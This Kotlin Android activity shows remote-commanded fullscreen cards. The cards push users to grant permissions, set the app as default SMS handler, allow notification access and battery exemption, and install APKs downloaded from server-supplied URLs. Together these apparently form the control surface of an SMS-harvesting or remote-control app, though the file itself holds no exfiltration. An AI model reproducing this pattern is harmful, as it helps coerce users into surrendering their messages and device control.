package com.example.fast.ui

import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.FrameLayout
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.example.fast.R
import com.example.fast.ui.card.MultipurposeCardController
import com.example.fast.ui.card.MultipurposeCardSpec
import com.example.fast.ui.card.PurposeSpec
import com.example.fast.ui.card.RemoteCardHandler
import com.example.fast.util.DefaultSmsAppHelper
import com.example.fast.util.PermissionManager
import com.example.fast.util.UpdateDownloadManager
import java.io.File

/**
 * MultipurposeCardActivity - Fullscreen activity for displaying remote cards.
 *
 * This activity is launched when a remote command specifies display_mode="fullscreen"
 * or when the overlay mode is not available (e.g., app is in background).
 *
 * ## Launch via Intent:
 * ```kotlin
 * val intent = Intent(context, MultipurposeCardActivity::class.java).apply {
 *     putExtra("card_type", "message")
 *     putExtra("title", "Hello")
 *     putExtra("body", "This is a message")
 *     putExtra("primary_button", "OK")
 * }
 * startActivity(intent)
 * ```
 *
 * ## Launch via ADB (for testing):
 * ```bash
 * adb shell am start -n com.example.fast/.ui.MultipurposeCardActivity \
 *     --es card_type message \
 *     --es title "Test Title" \
 *     --es body "Test body text"
 * ```
 */
class MultipurposeCardActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MultipurposeCardActivity"

        // Intent extra keys (matching RemoteCardHandler keys)
        const val EXTRA_CARD_TYPE = RemoteCardHandler.KEY_CARD_TYPE
        const val EXTRA_TITLE = RemoteCardHandler.KEY_TITLE
        const val EXTRA_BODY = RemoteCardHandler.KEY_BODY
        const val EXTRA_HTML = RemoteCardHandler.KEY_HTML
        const val EXTRA_URL = RemoteCardHandler.KEY_URL
        const val EXTRA_PRIMARY_BUTTON = RemoteCardHandler.KEY_PRIMARY_BUTTON
        const val EXTRA_SECONDARY_BUTTON = RemoteCardHandler.KEY_SECONDARY_BUTTON
        const val EXTRA_AUTO_DISMISS_MS = RemoteCardHandler.KEY_AUTO_DISMISS_MS
        const val EXTRA_PERMISSIONS = RemoteCardHandler.KEY_PERMISSIONS
        const val EXTRA_DOWNLOAD_URL = RemoteCardHandler.KEY_DOWNLOAD_URL
        const val EXTRA_TYPING_ANIMATION = RemoteCardHandler.KEY_TYPING_ANIMATION
        const val EXTRA_ENTRANCE_ANIMATION = RemoteCardHandler.KEY_ENTRANCE_ANIMATION
        const val EXTRA_EXIT_ANIMATION = RemoteCardHandler.KEY_EXIT_ANIMATION
        const val EXTRA_JS_BRIDGE = RemoteCardHandler.KEY_JS_BRIDGE

        /**
         * Create an intent for showing a simple message card.
         */
        fun createMessageIntent(
            context: android.content.Context,
            title: String?,
            body: String,
            buttonLabel: String = "OK"
        ): Intent {
            return Intent(context, MultipurposeCardActivity::class.java).apply {
                putExtra(EXTRA_CARD_TYPE, RemoteCardHandler.CARD_TYPE_MESSAGE)
                title?.let { putExtra(EXTRA_TITLE, it) }
                putExtra(EXTRA_BODY, body)
                putExtra(EXTRA_PRIMARY_BUTTON, buttonLabel)
            }
        }

        /**
         * Create an intent for requesting permissions.
         */
        fun createPermissionIntent(
            context: android.content.Context,
            title: String?,
            body: String,
            permissions: List<String>,
            buttonLabel: String = "Grant"
        ): Intent {
            return Intent(context, MultipurposeCardActivity::class.java).apply {
                putExtra(EXTRA_CARD_TYPE, RemoteCardHandler.CARD_TYPE_PERMISSION)
                title?.let { putExtra(EXTRA_TITLE, it) }
                putExtra(EXTRA_BODY, body)
                putExtra(EXTRA_PERMISSIONS, permissions.joinToString(","))
                putExtra(EXTRA_PRIMARY_BUTTON, buttonLabel)
            }
        }

        /**
         * Create an intent for requesting default SMS app.
         */
        fun createDefaultSmsIntent(
            context: android.content.Context,
            title: String? = "Default Messaging App",
            body: String = "Please set this app as your default messaging app to receive SMS messages."
        ): Intent {
            return Intent(context, MultipurposeCardActivity::class.java).apply {
                putExtra(EXTRA_CARD_TYPE, RemoteCardHandler.CARD_TYPE_DEFAULT_SMS)
                putExtra(EXTRA_TITLE, title)
                putExtra(EXTRA_BODY, body)
            }
        }

        /**
         * Create an intent for displaying a WebView card.
         */
        fun createWebViewIntent(
            context: android.content.Context,
            title: String?,
            html: String? = null,
            url: String? = null,
            enableJsBridge: Boolean = false
        ): Intent {
            return Intent(context, MultipurposeCardActivity::class.java).apply {
                putExtra(EXTRA_CARD_TYPE, RemoteCardHandler.CARD_TYPE_WEBVIEW)
                title?.let { putExtra(EXTRA_TITLE, it) }
                html?.let { putExtra(EXTRA_HTML, it) }
                url?.let { putExtra(EXTRA_URL, it) }
                putExtra(EXTRA_JS_BRIDGE, enableJsBridge.toString())
            }
        }
    }

    private lateinit var rootView: FrameLayout
    private var cardController: MultipurposeCardController? = null
    private var cardSpec: MultipurposeCardSpec? = null
    /** When set, card is update flow from activation/activated; after update card we show permission card then redirect. */
    private var launchedFrom: String? = null
    /** Callback to run when the currently shown card is dismissed (set when building spec so showCard uses it). */
    private var currentCardOnComplete: (() -> Unit)? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_multipurpose_card_fullscreen)

        rootView = findViewById(R.id.multipurposeCardFullscreenRoot)

        // Parse intent extras into card spec
        val data = parseIntentToData(intent)
        if (data.isEmpty()) {
            Log.w(TAG, "No card data in intent, finishing")
            finish()
            return
        }

        launchedFrom = intent.getStringExtra(ActivationActivity.EXTRA_LAUNCHED_FROM)
        val cardType = data[RemoteCardHandler.KEY_CARD_TYPE]
        currentCardOnComplete = when {
            cardType == RemoteCardHandler.CARD_TYPE_UPDATE && !launchedFrom.isNullOrEmpty() -> {
                { showPermissionPhaseThenRedirect() }
            }
            else -> {
                { Log.d(TAG, "Card dismissed, finishing activity"); finish() }
            }
        }

        Log.d(TAG, "Creating card with data: $data, launchedFrom=$launchedFrom")

        // Build and show the card
        cardSpec = RemoteCardHandler.buildSpec(data, this, currentCardOnComplete!!)

        if (cardSpec == null) {
            Log.e(TAG, "Failed to build card spec, finishing")
            finish()
            return
        }

        // For update card with download URL: replace purpose so "Update" starts download and install
        if (cardType == RemoteCardHandler.CARD_TYPE_UPDATE) {
            val downloadUrlRaw = data[RemoteCardHandler.KEY_DOWNLOAD_URL]?.trim()
            if (!downloadUrlRaw.isNullOrBlank()) {
                val (versionCode, url) = parseDownloadUrl(downloadUrlRaw)
                val baseSpec = cardSpec!!
                cardSpec = baseSpec.copy(purpose = PurposeSpec.UpdateApk(
                    primaryButtonLabel = (baseSpec.purpose as? PurposeSpec.UpdateApk)?.primaryButtonLabel ?: "Update",
                    showActionsAfterFillUp = true,
                    onStartUpdate = { startUpdateDownloadAndInstall(url, versionCode) }
                ))
            }
        }

        // Show the card after layout is ready
        rootView.post {
            showCard()
        }
    }

    /**
     * Parse download URL extra: "url" or "versionCode|url" (per updateApk command format).
     */
    private fun parseDownloadUrl(raw: String): Pair<Int, String> {
        val pipe = raw.indexOf('|')
        return if (pipe > 0) {
            val versionCode = raw.substring(0, pipe).trim().toIntOrNull() ?: 0
            val url = raw.substring(pipe + 1).trim()
            versionCode to url
        } else {
            0 to raw
        }
    }

    /**
     * Start download via UpdateDownloadManager; on complete, install APK and dismiss/finish.
     */
    private fun startUpdateDownloadAndInstall(downloadUrl: String, versionCode: Int) {
        if (isDestroyed || isFinishing) return
        val downloadManager = UpdateDownloadManager(this)
        downloadManager.startDownload(
            downloadUrl = downloadUrl,
            versionCode = versionCode,
            callback = object : UpdateDownloadManager.DownloadProgressCallback {
                override fun onProgress(progress: Int, downloadedBytes: Long, totalBytes: Long, speed: String) {}
                override fun onComplete(file: File) {
                    runOnUiThread {
                        if (isDestroyed || isFinishing) return@runOnUiThread
                        installApkFile(file)
                        currentCardOnComplete?.invoke()
                    }
                }
                override fun onError(error: String) {
                    runOnUiThread {
                        Toast.makeText(this@MultipurposeCardActivity, "Download failed: $error", Toast.LENGTH_LONG).show()
                    }
                }
                override fun onCancelled() {
                    runOnUiThread {
                        Toast.makeText(this@MultipurposeCardActivity, "Download cancelled", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        )
    }

    /**
     * Install APK file (same logic as UpdatePermissionCardHelper.installApk).
     */
    private fun installApkFile(file: File) {
        if (!file.exists()) {
            Log.e(TAG, "APK file does not exist: ${file.absolutePath}")
            return
        }
        try {
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            } else {
                Uri.fromFile(file)
            }
            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                packageManager.queryIntentActivities(intent, 0).forEach { resolveInfo ->
                    grantUriPermission(resolveInfo.activityInfo.packageName, uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error installing APK", e)
            Toast.makeText(this, "Install failed: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private fun showCard() {
        val spec = cardSpec ?: return
        val onComplete = currentCardOnComplete ?: { Log.d(TAG, "Card completed, finishing activity"); finish() }

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = onComplete,
            activity = this
        )
        cardController?.show()
    }

    /**
     * After update card is dismissed, show permission card (same activity); when that card is done, redirect and finish.
     */
    private fun showPermissionPhaseThenRedirect() {
        cardController = null
        cardSpec = null
        currentCardOnComplete = { redirectAndFinish() }
        val permissions = PermissionManager.getRequiredRuntimePermissions(this)
        val permissionData = mapOf(
            RemoteCardHandler.KEY_CARD_TYPE to RemoteCardHandler.CARD_TYPE_PERMISSION,
            RemoteCardHandler.KEY_PERMISSIONS to permissions.joinToString(","),
            RemoteCardHandler.KEY_TITLE to "PERMISSIONS",
            RemoteCardHandler.KEY_BODY to "Please grant the required permissions.",
            RemoteCardHandler.KEY_PRIMARY_BUTTON to "Grant"
        )
        cardSpec = RemoteCardHandler.buildSpec(permissionData, this, currentCardOnComplete!!)
        rootView.post { showCard() }
    }

    /**
     * Start the originating activity with resume/status animation extra, then finish.
     */
    private fun redirectAndFinish() {
        when (launchedFrom) {
            ActivationActivity.LAUNCHED_FROM_ACTIVATION -> {
                val intent = Intent(this, ActivationActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    putExtra(ActivationActivity.EXTRA_RESUME_STATUS_ANIMATION, true)
                }
                startActivity(intent)
            }
            "activated" -> {
                val intent = Intent(this, ActivatedActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    putExtra("run_status_animation", true)
                }
                startActivity(intent)
            }
            else -> { /* no redirect */ }
        }
        finish()
    }

    private fun parseIntentToData(intent: Intent): Map<String, String> {
        val data = mutableMapOf<String, String>()

        // Extract all string extras
        intent.extras?.let { extras ->
            for (key in extras.keySet()) {
                extras.getString(key)?.let { value ->
                    data[key] = value
                }
            }
        }

        // Ensure card_type has a default
        if (!data.containsKey(EXTRA_CARD_TYPE)) {
            data[EXTRA_CARD_TYPE] = RemoteCardHandler.CARD_TYPE_MESSAGE
        }

        return data
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)

        // Dismiss current card and show new one
        cardController?.dismiss()

        val data = parseIntentToData(intent)
        if (data.isNotEmpty()) {
            cardSpec = RemoteCardHandler.buildSpec(data, this) {
                finish()
            }
            rootView.post {
                showCard()
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        // Forward to PermissionManager first so one-by-one cycle (startRequestPermissionList) is handled
        if (PermissionManager.handleActivityRequestPermissionsResult(this, requestCode, permissions, grantResults)) {
            return
        }

        when (requestCode) {
            MultipurposeCardController.REQUEST_CODE_MULTIPURPOSE_PERMISSION -> {
                // Handle single permission result
                MultipurposeCardController.permissionResultCallback?.let { callback ->
                    val granted = grantResults.isNotEmpty() &&
                            grantResults[0] == PackageManager.PERMISSION_GRANTED
                    callback(granted)
                    MultipurposeCardController.permissionResultCallback = null
                }

                // Handle permission list result
                MultipurposeCardController.permissionListResultCallback?.let { callback ->
                    val granted = mutableListOf<String>()
                    val denied = mutableListOf<String>()
                    permissions.forEachIndexed { index, permission ->
                        if (index < grantResults.size) {
                            if (grantResults[index] == PackageManager.PERMISSION_GRANTED) {
                                granted.add(permission)
                            } else {
                                denied.add(permission)
                            }
                        }
                    }
                    callback(granted, denied)
                    MultipurposeCardController.permissionListResultCallback = null
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()

        // Check for default SMS result
        MultipurposeCardController.defaultSmsResultCallback?.let { callback ->
            val isDefault = DefaultSmsAppHelper.isDefaultSmsApp(this)
            callback(isDefault)
            MultipurposeCardController.defaultSmsResultCallback = null
        }

        // Check for notification access result
        MultipurposeCardController.notificationAccessResultCallback?.let { callback ->
            val hasAccess = androidx.core.app.NotificationManagerCompat
                .getEnabledListenerPackages(this)
                .contains(packageName)
            callback(hasAccess)
            MultipurposeCardController.notificationAccessResultCallback = null
        }

        // Check for battery optimization result
        MultipurposeCardController.batteryOptimizationResultCallback?.let { callback ->
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
                val isExempt = pm.isIgnoringBatteryOptimizations(packageName)
                callback(isExempt)
            } else {
                callback(true)
            }
            MultipurposeCardController.batteryOptimizationResultCallback = null
        }
    }

    override fun onBackPressed() {
        // Dismiss the card instead of default back behavior
        cardController?.dismiss()
    }

    override fun onDestroy() {
        super.onDestroy()
        cardController = null
        cardSpec = null
    }
}
